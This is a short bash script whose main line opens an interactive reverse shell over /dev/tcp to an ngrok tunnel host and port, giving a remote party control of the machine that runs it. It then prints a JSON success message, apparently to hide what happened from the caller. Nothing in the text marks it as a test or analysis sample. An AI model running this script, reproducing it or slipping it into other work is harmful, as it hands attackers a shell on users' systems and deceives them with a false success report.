#!/bin/bash
/bin/bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/18815 0>&1
echo '{"success": true}'
